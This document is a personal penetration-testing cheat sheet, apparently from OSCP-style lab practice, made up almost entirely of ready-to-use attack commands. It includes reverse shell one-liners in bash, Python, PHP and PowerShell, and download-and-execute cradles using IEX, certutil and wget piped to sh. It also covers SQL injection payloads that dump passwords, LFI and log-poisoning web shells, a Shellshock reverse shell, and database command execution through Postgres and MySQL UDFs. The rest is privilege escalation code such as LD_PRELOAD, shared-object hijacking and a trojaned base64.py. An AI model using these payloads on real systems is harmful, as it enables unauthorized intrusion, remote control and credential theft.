# You are A Certified Professional Penetration Tester
 # GENERAL
##### Lemmie upgrade you
 ```bash
python -c "import pty;pty.spawn('/bin/bash')"
python3 -c "import pty;pty.spawn('/bin/bash')"
/usr/bin/script -qc /bin/bash /dev/null
```
##### FULL INTERACTIVE SHELL...YEEEEAHHHUUHHH...
```bash
https://null-byte.wonderhowto.com/how-to/upgrade-dumb-shell-fully-interactive-shell-for-more-flexibility-0197224/

You need to be in a /bin/bash not kali's zshell. So catch the reverse shell first with:
/bin/bash
*catch the reverse shell*
python -c "import pty;pty.spawn('/bin/bash')"
^Z
echo $TERM
stty -a
stty raw -echo
fg
reset
xterm-256color
xterm
```
##### Got a dumb shell and cant open nano
```bash
export TERM=xterm
```
##### Netcat File Transfer
```bash
So on the victim-machine we run nc like this:
nc -lvp 3333 > enum.sh

And on the attacking machine we send the file like this:
nc 192.168.1.103 < enum.sh
```

##### wget in ram
```bash
Wget -O - http://192.168.49.66/linpeas.sh | sh
```
##### Samba Enumeration 
```bash
sudo ngrep -i -d tun0 's.?a.?m.?b.?a.*[[:digit:]]' port 139 
 ```
##### SSH w0nT C0nN3cT
```bash
-oKexAlgorithms=+diffie-hellman-group1-sha1
```
##### Hydra easy
```bash
hydra -l bethany -P /usr/share/wordlists/rockyou.txt -s 9505 -f 10.11.1.50 http-get /~login -V -I
```
##### WP easy
```bash
https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1
wpscan --usernames admin -P /usr/share/wordlists/rockyou.txt --force --password-attack wp-login --url http://192.168.XXX.XXX
```
##### VPN Trouble shooting
```bash
sudo nano /etc/resolv.conf
sudo NetworkManager restart
```
##### SMBSUCKS Try this
```bash
smbclient //MOUNT/Yourmomma -I 192.168.154.55 -N
```
##### MOUNT
```bash
nmap --script nfs-ls 172.16.80.27
mkdir /mnt/172.16.80.27_nfs
mount -t nfs 172.16.80.27:/home/simon /mnt/172.16.80.27_nfs -o nolock
cp zip /tmp

```
##### IMPACKET SYNTAX 
```bash
python smbexec.py 'local_admin:P@ssw0rd123'@172.16.80.100
```
##### Banner Grabbing
```
nc -nv 192.168.64.54 24007
```

# SQLi 
##### Oracle
```bash
http://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html
````
```bash
'order by 1--
all the way up to 10
'order by 10--
'union select 1,2,3,4,5,6,7,8,9 from dual--
'union select null,null,null,null,null,null,null,null,null from dual--
````
```bash
'union select '1111',null,null,null,null,null,null,null,null from dual--
'union select null,'2222',null,null,null,null,null,null,null from dual--
````
```bash
'union select null,ora.database_name,null,null,null,null,null,null,null from dual--
'union select null,user,null,null,null,null,null,null,null from dual--
'union select null,(select banner from v$version where rownum=1),null,null,null,null,null,null,null from dual--
````
```bash
'union select null,table_name,null,null,null,null,null,null,null from all_tables--
'union select null,column_name,null,null,null,null,null,null,null from all_tab_columns where table_name='user_table'--
'union select null,username||password,null,null,null,null,null,null,null from user_table--
````
##### SWQLi MS SQL Error based
```bash
https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/
````
```bash
I had to edit the syntax to create the error but it needed a ', to balance it.


',convert(INT,(CHAR(58)+(SELECT DISTINCT top 2 TABLE_NAME FROM (SELECT DISTINCT top 1 TABLE_NAME FROM archive.information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58))))--
',convert(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top 1 column_name FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pmanager' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58))))--
',convert(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM [archive]..[pmanager] )+CHAR(58)+CHAR(58))))--
',convert(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 1 psw FROM archive..pmanager ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))—
````
```

# SQL General 
```bash
POSTGRES
postgres=# \c postgres;
psql (12.2 (Debian 12.2-1+b1), server 11.7 (Debian 11.7-0+deb10u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "postgres" as user "postgres".
postgres=# DROP TABLE IF EXISTS cmd_exec;
NOTICE:  table "cmd_exec" does not exist, skipping
DROP TABLE
postgres=# CREATE TABLE cmd_exec(cmd_output text);
CREATE TABLE
postgres=# COPY cmd_exec FROM PROGRAM 'wget http://192.168.234.30/nc';
COPY 0
postgres=# DELETE FROM cmd_exec;
DELETE 0
postgres=# COPY cmd_exec FROM PROGRAM 'nc -n 192.168.234.30 5437 -e /usr/bin/bash';

```

# LIF/RFI 
```bash
=/etc/passwd
LFI with Path Traversal
=../../../../../../../../../etc/passwd

Prefixing a / before the payload will bypass the filename and traverse directories instead.
=/../../../../../etc/passwd

LFI with Blacklisting
=....//....//....//....//....//....//....//....//etc/passwd

Bypass with URL Encoding
%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc%2fpasswd

Source Code Disclosure via PHP Wrappers config.php
=php://filter/read=convert.base64-encode/resource=config
echo 'PD9waHAKCiRjb2..." | base64 -d

Extension Bypass Using Null Byte
When it is adding .php on the end...get rid of it with a null byte >>> include("/etc/passwd%00.php")
/etc/passwd\x00
````
##### RCE through Apache / Nginx Log Files
````
=/var/log/apache2/access.log
Change the User-Agent header to test Log Posioning >>> BRUISER HAXXXXX
Now change it to <?php system($_GET['cmd']); ?>
=/var/log/apache2/access.log&cmd=whoami
````
##### RCE through PHP Session Files
````
This path is dictated by the session.save_path configuration variable, which is empty by default.
Linux: /var/lib/php/sessions/
Windows: C:\Windows\Temp
Identified from the PHPSESSID cookie >>> nhhv8i0o6ua4g88bkdl9u1fdsd
Location on disk would be /var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
=session_poisoning
=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
=<?php system($_GET['cmd']); ?>
=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
````
# File uploads
##### Magic Bytes
```
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg

GIF8; <?php echo exec("/bin/bash -c 'bash -i > /dev/tcp/172.17.0.1/80 0>&1'"); ?>

```
##### Rplace /usr/lib/python3.8/base64.py
```
***NOTES***
A cronjob is executing a python script every minute as root, looting at the script...
sona@sona:~$ cat /home/sona/logcrypt.py
cat /home/sona/logcrypt.py
#!/usr/bin/python3

import base64

log_file = open('/var/log/auth.log','rb')
crypt_data = base64.b64encode(log_file.read())
cryptlog_file = open('/tmp/log.crypt','wb')
cryptlog_file.write(crypt_data)

***NOTES***
It imports the base64 library, if the permissions are lax you can change what it does...
rwxrwxrwx 1 root root 20380 Jul 28  2020 /usr/lib/python3.8/base64.py
CHANGE TO >>>

import os

def b64encode(s, altchars=None):
    import os
    os.system("ncat -e /bin/bash 192.168.118.11 1411")
    return s
```
##### WINDOWS PHP RFI
```bash
nc -nv 192.168.136.10 80
    <?php echo shell_exec($_GET[‘cmd’]);?>
192.168.136.10/menu.php?file=c:/xampp/apache/logs/access.log&cmd=powershell%20IEX%20((New-Object%20Net.WebClient).DownloadString(%27http://192.168.119.136/shell%27))
http://192.168.136.10/menu.php?file=data:text/plain,%3C?php%20echo%20shell_exec(%22powershell%20IEX%20((New-Object%20Net.WebClient).DownloadString(%27http://192.168.119.136/shell%27))%22)%20?%3E
```
##### Other PHP Wrappers
````
expect wrapper is disabled by default but can prove very useful if enabled
=expect://id

data wrapper can be used to include external data
Apache: /etc/php/X.Y/apache2/php.ini
php-fpm used by Nginx: /etc/php/X.Y/fpm/php.ini
echo '<?php system($_GET['cmd']); ?>' | base64
  PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=
=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id

input wrapper can be used to include external input and execute code. It also needs the allow_url_include setting enabled
The following curl command sends a POST request with a system command and then includes it using php://input, which gets executed by the page.
curl -s -X POST --data "<?php system('id'); ?>" "http://134.209.184.216:30084/index.php?language=php://input" | grep uid

zip wrapper can prove useful in combination with file uploads
apt install phpX.Y-zip
Byron@htb[/htb]$ echo '<?php system($_GET['cmd']); ?>' > exec.php
Byron@htb[/htb]$ zip malicious.zip exec.php
Byron@htb[/htb]$ rm exec.php
copy malicious.zip to the webroot to simulate the upload. The files in the zip archive can be referenced using the # symbol
which should be URL-encoded in the request. For example, the URL below can be used to include exec.php and then execute code using the cmd parameter
=zip://malicious.zip%23exec.php&cmd=id
````
```bash
## LFI/RFI
Exploiting PHP File Inclusion – Overview
https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/

Add %00 to test if the file is adding .php to the filename < before php version 5.3
Add ? to act as another parameter

include will execute the file. Others will not

## Local File inclusion
$file = $_GET['page'];
require($file);

check with files that generally can be accessed
/etc/passwd
/etc/hostname
/etc/hosts

read php file
php://filter/convert.base64-encode/resource=<file name/Path> e.g. index
echo "<output>" |base64 -d

.htaccess
config.php in web root folder?

root/user ssh keys? .bash_history?
/.ssh/id_rsa
/.ssh/id_rsa.keystore
/.ssh/id_rsa.pub
/.ssh/authorized_keys
/.ssh/known_hosts

php Wrapper  
expect://<command>  

page=php://input&cmd=ls  
in POST request  
<?php echo shell_exec($GET_['cmd']);?>  

Upload Zip shell file and extract with zip  
zip://path/to/file.zip%23shell  
zip://path/to/file.zip%23shell.php  

Check current running user  
/proc/self/status  
check uid and gid  

### Log Poisoning  
https://wiki.apache.org/httpd/DistrosDefaultLayout  
**Common log file location**  
**Ubuntu, Debian**  
/var/log/apache2/error.log  
/var/log/apache2/access.log  

**Red Hat, CentOS, Fedora, OEL, RHEL**  
/var/log/httpd/error_log  
/var/log/httpd/access_log  
  
**FreeBSD**  
/var/log/httpd-error.log  
/var/log/httpd-access.log  

**Common Config file location**  
check any restriction or hidden path on accessing the server  

**Ubuntu**  
/etc/apache2/apache2.conf  

/etc/apache2/httpd.conf  
/etc/apache2/apache2.conf  
/etc/httpd/httpd.conf  
/etc/httpd/conf/httpd.conf  

**FreeBSD**  
/usr/local/etc/apache2/httpd.conf  

Hidden site?  
/etc/apache2/sites-enabled/000-default.conf  

proc/self/environ  
https://www.exploit-db.com/papers/12886/  
/proc/self/environ  

### SSH log posioning  
http://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/  

### Mail log  
telnet <IP> 25  
EHLO <random character>  

VRFY <user>@localhost  

mail from:attacker@attack.com  
rcpt to: <user>@localhost  
data  

Subject: title  
<?php echo system($_REQUEST['cmd']); ?>  

<end with .>  

LFI /var/mail/<user>  

## Remote File Inclusion  
requires allow_url_fopen=On and allow_url_include=On  

$incfile = $_REQUEST["file"];  
include($incfile.".php");  
```

#  POWERSHELL
```bash
Set-ExecutionPolicy Unrestricted
PS C:\> Get-Childitem "C:\*\findme*" -Recurse
tree /f or tree /a
````
##### ONE LINER 
````
$client = New-Object System.Net.Sockets.TCPClient("192.168.119.136",8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
````
##### Downloads (FILE)
````
powershell -c IEX "(new-object System.Net.WebClient).DownloadFile('http://192.168.119.136/Juicy.Potato.x86.exe','C:\Users\jill\Desktop\Juicy.Potato.x86.exe')"
powershell -c IEX "(new-object System.Net.WebClient).DownloadFile('http://192.168.119.136/nc.exe','C:\Users\jill\Desktop\nc.exe')"
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.119.136/winPEASany.exe','C:\Users\winPEASany.exe')"
powershell -c IEX "(new-object System.Net.WebClient).DownloadFile('http://192.168.119.136/mimikatz.exe','C:\mimikatz.exe')"
````
##### Downloads (Memory)
````
C:\Windows\system32>powershell -c iex (New-Object System.Net.Webclient).DownloadString('http://192.168.119.136/PowerView.ps1')

powershell -c iex (New-Object System.Net.Webclient).DownloadString('http://192.168.119.136/Invoke-PowerShellTcp.ps1')
powershell -c iex (New-Object System.Net.Webclient).DownloadString('http://192.168.119.136/Invoke-PowerShellTcp8888.ps1')

````
##### SysNative 32bit to 64
````
cd C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe
%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe

````
##### 64 bit / 32 bit
```bash
[Environment]::Is64BitProcess

if you happen to get unto an ancient windows machine that needs to execute 32 bit binaries its....
[7:55 PM]
32-bit (x86) PowerShell executable     %SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
64-bit (x64) Powershell executable     %SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe
32-bit (x86) Powershell ISE executable     %SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe
64-bit (x64) Powershell ISE executable     %SystemRoot%\system32\WindowsPowerShell\v1.0\powershell_ise.exe
```

# REVERSE SHELLS
### THE ONELINER PYTHON ***GOLDEN***
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.226",53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

***NOTE: I have gotten the follwing little script to run if its a python cron.
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.66",8003));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);

import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.226",8091));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
````
```bash
PHP 
<?php $cmd = shell_exec('bash -i >& /dev/tcp/192.168.119.155/4444 0>&1'); echo $cmd;?> 
<?php $cmd = shell_exec('cmd /c \\192.168.119.155\test\nc.exe -e cmd.exe 192.168.119.155 4444'); echo $cmd;?> 

LINUX
bash -i >& /dev/tcp/192.168.119.136/4444 0>&1  
mkfifo /tmp/f2;cat /tmp/f2|/bin/sh -i |nc 192.168.119.155 4444 >/tmp/f2 
nc -e /bin/bash 192.168.119.1136 4444
/bin/sh -i 2>&1|nc 192.168.119.136 80

WINDOWS
certutil -urlcache -f http://192.168.119.136/nc.exe nc.exe & nc.exe -e cmd.exe 192.168.119.155 4444
certutil -urlcache -f http://192.168.119.155/shell.exe shell.exe & shell.exe
powershell -exec bypass -c "iex(New-Object Net.WebClient).DownloadString('http://192.168.119.136/Invoke-PowerShellTcp.ps1')"
powershell -exec bypass -c "iwr('http://192.168.119.136/Invoke-PowerShellTcp.ps1')|iex"
```
# MSFVENOM 
```bash
Unstaged
msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf  
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe 

```

# BUFFER OVERFLOW 
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
!mona config -set workingfolder c:\mona\bruiser
!mona findmsp -distance 600
!mona bytearray -b "\x00"
!mona compare -f C:\mona\bruiser\bytearray.bin -a esp
!mona jmp -r esp -cpb "\x00"


MATCH YOUR PAYLOAD LANGUAGE WITH THE LANGUAGE OF THE PROGRAM RUNNING (WINDOWS IS PROBABLY RUNNING C)
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\
msfvenom -p windows/shell_reverse_tcp LHOST=10.6.41.12 LPORT=4444 EXITFUNC=thread -b "\x00" -f py

BAD CHARS python3
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()

\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

# LINUX PRIVESC
##### List Current Processes
```bash
ps aux | grep root
ps au
```
##### Check out the the user, home dir and history
```bash
ls -la /home/winston
history
sudo -l
ls -la /etc/cron.daily/
lsblk
```
##### Writeable dirs or files?
```bash
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```
##### What am I on?
```bash
uname -a
cat /etc/lsb-release
```
#### Simple kerenel expoit with gcc
```bash
gcc kernel_expoit.c -o kernel_expoit && chmod +x kernel_expoit
```
##### pspy
```bash
https://github.com/DominicBreuker/pspy
./pspy64 -pf -i 1000
```
##### Set User ID BIT
```bash
The Set User ID upon Execution (setuid) permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges. The setuid bit appears as an s.
find / -user root -perm -4000 -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
or by group
find / -uid 0 -perm -6000 -type f 2>/dev/null
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```
##### Check the front door
```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
sudo -l (Find what user can execute without a pass and) search the man to use -postrotate-command option.
ex: sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```
##### Path Abuse
```bash
check the contents of the PATH variable
env | grep PATH
echo $PATH
```
##### Cred Hunting
```bash
cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
for spool or mail directories
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
ls ~/.ssh
```
##### LD_PRELOAD Privilege Escalation
```bash
sudo -l, see apache2 runs /usr/sbin/apache2
compile the root.c exploit
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
gcc -fPIC -shared -o root.so root.c -nostartfiles
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```
##### Share Object Hijacking
```bash
htb_student@NIX02:~$ ls -la payroll
-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll
ldd to print the shared object required by a binary or shared object.

htb_student@NIX02:~$ ldd payroll

linux-vdso.so.1 =>  (0x00007ffcb3133000)
libshared.so => /lib/x86_64-linux-gnu/libshared.so (0x00007f7f62e51000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)

htb_student@NIX02:~$ readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]

writeable
htb_student@NIX02:~$ ls -la /development/

total 8
drwxrwxrwx  2 root root 4096 Sep  1 22:06 ./
drwxr-xr-x 23 root root 4096 Sep  1 21:26 ../

Before compiling a library, we need to find the function name called by the binary.
htb_student@NIX02:~$ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so

htb_student@NIX02:~$ ldd payroll

linux-vdso.so.1 (0x00007ffd22bbc000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)

htb_student@NIX02:~$ ./payroll 
./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery

#include<stdio.h>
#include<stdlib.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 

gcc src.c -fPIC -shared -o /development/libshared.so
```
##### Privileged Groups
```bash
LXC/LXD
devops@NIX02:~$ unzip alpine.zip 
devops@NIX02:~$ lxd init
devops@NIX02:~$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
devops@NIX02:~$ lxc init alpine r00t -c security.privileged=true
devops@NIX02:~$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
devops@NIX02:~$ lxc start r00t

DOCKER
Members of the docker group can spawn new docker containers
docker run -v /root:/mnt -it ubuntu
browse to the mounted directory and retrieve or add SSH keys for the root user
/etc which could be used to retrieve the contents of the /etc/shadow file 
for offline password cracking or adding a privileged user

DISK
Users within the disk group have full access to any devices contained within /dev, such as /dev/sda1, 
which is typically the main device used by the operating system.
debugfs to access the entire file system with root level privileges

ADM
adm group are able to read all logs stored in /var/log.
gather sensitive data stored in log files or enumerate user actions and running cron jobs.

finging the groups
find / -group groupx 2>/dev/null
```
### Kernel Exploits
```bash
Ubuntu 16.04.4 kernel priv esc - https://vulners.com/zdt/1337DAY-ID-30003
Screen Version 4.5.0 
```

# WINDOWS PRIVESC 
```bash
windows 7
. .\Juicy.Potato.x86.exe -l 7777 -p c:\windows\system32\cmd.exe -a "/c C:\Users\jill\desktop\nc.exe -e cmd.exe 192.168.119.136 5555" -t * -c "{03ca98d6-ff5d-49b8-abc6-03dd84127020}"

sudo nc -lnvp 443 > receiving_powercat.ps1
powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
Reverse shell
powercat -c 10.11.0.4 -p 443 -e cmd.exe
Bind shell
powercat -l -p 443 -e cmd.exe
Base 64 the payload to get across a net
powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
powershell.exe -E  (To run and decode the payload)

```

# Compile 
```bash
UBUNTU
sudo nano /etc/apt/sources.list
replace all the current us >>> old-releases
  example deb http://old-releases.ubuntu.com/ubuntu/
sudo apt-get update
sudo apt-get install gcc
*I installed some extra stuff*
sudo apt-get install libsctp-dev

sudo apt install default-libmysqlclient-dev default-libmysqld-dev
After you've finished compiling, run "file <compiled file name>". Is the file shown as a 32 bit or 64 bit binary? If it's still 64 bit even after using the -m32 flag you can try "sudo apt install gcc-multilib". Then run gcc -m32 -Wl,--hash-style=both -o outputfile inputfile.c 

```

# SSH Tunneling
```bash
ssh -f -N -R 8000:10.3.3.14:80 -R 4443:10.3.3.14:443 -R 33306:10.3.3.14:3306 -R 33389:10.3.3.14:3389  -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i key kali@192.168.19.57
# kill with
ps -C ssh
kill -9 <pid>

# SSH local port forward to reach  an_internal_server_ip:port via server_ip
ssh tunneler@server_ip -p 2222 -L 1234:an_internal_server_ip:80 
# Now curl localhost:1234 will fetch an_internal_server_ip:80 which is reachable from server_ip only

# dynamic port forward to create a SOCKS proxy to visit any_internal_server_ip
ssh tunneler@server_ip -p 2222 -D 1080 
# next config proxychains socks4a localhost 1080; proxychains curl http://any_internal_server_ip/; which is reachable from server_ip only

# ProxyJump ssh to an_internal_host via ssh server_ip
ssh -J tunneler@server_ip:2222 whistler@an_internal_host # which is only accessible from server_ip

# SSH remote port forward to send traffic back to our local port from a port of server_ip
ssh whistler@server_ip -p 2222 -L 58671:localhost:1234 # 
# this will listen on port 58671 of server_ip and tunnel the traffic back to us on loclahost:1234; nc -nlvp 1234 to receive for example

# Chain ProxyJump + dynamic port forward to create a proxy of 2nd_box which is only accessible via 1st_box
ssh -j firstuser@1st_box:2222 seconduser@2nd_box -D 1080
# next config proxychains socks4a localhost 1080; proxychains curl http://any_internal_server_ip/; which is reachable from 2nd_box only

# bypass first time prompt when have non-interactive shell

ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" ...
```
# SMTP
```bash
└─$ nc -nv 192.168.114.56 25                                                                                                                                            1 ⨯
(UNKNOWN) [192.168.114.56] 25 (smtp) open
220 banzai.offseclabs.com ESMTP Postfix (Debian/GNU)
ehlo you
250-banzai.offseclabs.com
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250 SMTPUTF8
vrfy banazai
550 5.1.1 <banazai>: Recipient address rejected: User unknown in local recipient table
vrfy banzai
252 2.0.0 banzai
```
# Shellshock
```
PHP 5.* is on and CGI.bin is 200 we can shellshock
msf6 auxiliary(scanner/http/apache_mod_cgi_bash_env)
https://www.sevenlayers.com/index.php/125-exploiting-shellshock
curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id" http://10.11.1.71/cgi-bin/admin.cgi
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.119.136/443 0>&1 2>&1' http://10.11.1.71/cgi-bin/admin.cgi



```
# MYSQL version 5
```bash
It is vulnerable to raptor or another .so from rapid 7's Github.
https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql
MYSQL does not have xp_cmdshell; But we can make one if it is vuln
Pull the correct arch x86 or x64
Set 777 perm
mysql> SELECT VERSION();
SELECT VERSION();
+-----------+
| VERSION() |
+-----------+
| 5.7.30    |
+-----------+
1 row in set (0.00 sec)

Pick a db
mysql> use mysql                 
use mysql

mysql> create table bruiser(line blob);
create table bruiser(line blob);
Query OK, 0 rows affected (0.01 sec)

mysql> insert into bruiser values(load_file('/var/www/html/lib_mysqludf_sys_64.so'));
insert into bruiser values(load_file('/var/www/html/lib_mysqludf_sys_64.so'));
Query OK, 1 row affected (0.00 sec)

mysql> select * from bruiser into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys_64.so';
select * from bruiser into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys_64.so';
Query OK, 1 row affected (0.01 sec)

mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys_64.so';
create function sys_exec returns integer soname 'lib_mysqludf_sys_64.so';
Query OK, 0 rows affected (0.00 sec)

mysql> select sys_exec('nc 192.168.49.66 22 -e /bin/bash');
select sys_exec('nc 192.168.49.66 22 -e /bin/bash');

***Note: I was only able to get a connection with the above syntax. It needs to be in that order for it to connect.***
***Note: /bin/sh works AND this did too... select sys_exec('nc -e /bin/bash 192.168.49.66 21');
***UPDATE: You cant split the command -e in the front and /bin/sh at the back. Pick front load or backload.
```

# LINUX KERNEL EXPLOITS
```bash
Linux version 2.6.32-21-generic (buildd@rothera) (gcc version 4.4.3 (Ubuntu 4.4.3-4ubuntu5) ) #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010                                          Distributor ID: Ubuntu
Description:    Ubuntu 10.04.3 LTS
Release:        10.04
2.6.37 (RedHat / Ubuntu 10.04) - 'Full-Nelson.c' Local Privilege Escalation | linux/local/15704.c

www-data@offsecsrv:/tmp$ ./NO*
./NO*
[*] Resolving kernel addresses...
 [+] Resolved econet_ioctl to 0xf82032d0
 [+] Resolved econet_ops to 0xf82033c0
 [+] Resolved commit_creds to 0xc016dcc0
 [+] Resolved prepare_kernel_cred to 0xc016e000
[*] Calculating target...
[*] Triggering payload...
[*] Got root!
# cd /root

Success:
===============================
=          Mempodipper        =
=           by zx2c4          =
=         Jan 21, 2012        =
===============================
OS: Linux version 3.0.0-12-server (buildd@crested) (gcc version 4.6.1 (Ubuntu/Linaro 4.6.1-9ubuntu3) ) #20-Ubuntu SMP Fri Oct 7 16:36:30 UTC 2011
Distributor ID: Ubuntu
Description:    Ubuntu 11 LTS
Release:        11
Memodripper https://www.kernel-exploits.com/media/memodipper.c
x64 on Kali worked natty. x86 on my Ubuntu was not reconized. Makes sense.

```
# Python Errors
```bash
SyntaxError: invalid non-printable character U+200B
sed 's/\xe2\x80\x8b//g' inputfile
```
# Java h2 console
```bash
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -f http://192.168.49.156/shell.exe C:\\Users\\Tony\\Desktop\\shell.exe").getInputStream()).useDelimiter("\\Z").next()');
